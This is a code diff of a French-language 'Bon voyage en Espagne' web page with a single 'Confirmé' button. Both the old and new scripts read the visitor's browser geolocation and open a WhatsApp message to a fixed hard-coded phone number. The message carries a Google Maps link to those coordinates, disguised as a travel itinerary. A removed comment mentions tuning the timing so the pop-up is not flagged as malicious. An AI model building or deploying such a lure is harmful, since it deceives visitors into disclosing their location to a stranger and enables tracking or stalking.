@@ -32,15 +32,6 @@
             margin-bottom: 15px;
             animation: fadeIn 2s ease-in-out;
         }
-        #locationMessage {
-            font-size: 18px;
-            margin-bottom: 20px;
-            padding: 15px;
-            background-color: #e9f7ef;
-            border-radius: 10px;
-            display: none;
-            animation: slideIn 1s ease-in-out;
-        }
         button {
             background-color: #25d366; 
             color: white;
@@ -58,18 +49,6 @@
             0% { background: linear-gradient(45deg, #ff7e5f, #feb47b); }
             100% { background: linear-gradient(45deg, #feb47b, #ff7e5f); }
         }
-        @keyframes zoomIn {
-            0% { transform: scale(0.9); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-        @keyframes slideIn {
-            0% { transform: translateY(20px); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
     </style>
 </head>
 <body>
@@ -77,82 +56,26 @@
 <div class="container">
     <h1>Bon voyage en Espagne 🇪🇸 !</h1>
     <p>Confirmez votre voyage en un seul clic !</p>
-
-    <div id="locationMessage">Bon voyage ! Nous vous avons réservé un itinéraire pour l'Espagne 🇪🇸.</div>
-
     <button id="sendLocationButton">Confirmé</button>
 </div>
 
 <script>
-    let lat, lon;
-
-    // Fonction pour obtenir la localisation
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
-        } else {
-            alert("Géolocalisation non supportée par ce navigateur.");
-        }
-    }
-
-    // Si la localisation est récupérée avec succès
-    function showPosition(position) {
-        lat = position.coords.latitude;
-        lon = position.coords.longitude;
-
-        // Affiche un message animé
-        document.getElementById('locationMessage').style.display = 'block'; // Affiche le message
-        document.getElementById('locationMessage').innerText = `Bon voyage ! Nous vous avons réservé un itinéraire pour l'Espagne 🇪🇸.`;
-        document.getElementById('locationMessage').style.animation = 'slideIn 1s ease-in-out';
-        
-        // Après un délai, on envoie la position via WhatsApp
-        setTimeout(function() {
-            sendLocationOnWhatsApp();
-        }, 500); // Réduction du délai à 500ms pour éviter que ce ne soit considéré comme un pop-up malveillant
-    }
-
-    // En cas d'erreur lors de la récupération de la position
-    function showError(error) {
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                alert("L'utilisateur a refusé la demande de géolocalisation.");
-                break;
-            case error.POSITION_UNAVAILABLE:
-                alert("La position est indisponible.");
-                break;
-            case error.TIMEOUT:
-                alert("La demande de géolocalisation a expiré.");
-                break;
-            case error.UNKNOWN_ERROR:
-                alert("Une erreur inconnue est survenue.");
-                break;
-        }
-    }
-
-    // Fonction pour envoyer la localisation sur WhatsApp
-    function sendLocationOnWhatsApp() {
-        if (lat && lon) {
-            const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `Bon voyage ! 🇪🇸 Voici votre itinéraire pour l'Espagne : ${locationUrl}`;
-
-            const whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
-            
-            // L'utilisateur clique sur un bouton pour autoriser l'ouverture de la fenêtre
-            const whatsappWindow = window.open(whatsappUrl, '_blank');
-            if (whatsappWindow) {
-                // Si la fenêtre a bien été ouverte, cela signifie qu'elle n'a pas été bloquée
-                whatsappWindow.focus();
-            } else {
-                alert("Le pop-up a été bloqué. Veuillez autoriser les pop-ups pour ce site.");
-            }
-        } else {
-            alert("Veuillez activer la géolocalisation pour partager votre position.");
-        }
-    }
-
-    // Lorsque le bouton est cliqué
     document.getElementById('sendLocationButton').addEventListener('click', function() {
-        getLocation();
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                let message = `Bon voyage ! 🇪🇸 Voici votre itinéraire pour l'Espagne : https://www.google.com/maps?q=${lat},${lon}`;
+                let whatsappUrl = `https://wa.me/33605993097?text=${encodeURIComponent(message)}`;
+                
+                // Ouvrir WhatsApp immédiatement après le clic
+                window.open(whatsappUrl, '_blank');
+            }, () => {
+                alert("Impossible de récupérer votre position. Activez la géolocalisation.");
+            });
+        } else {
+            alert("Votre navigateur ne supporte pas la géolocalisation.");
+        }
     });
 </script>
 
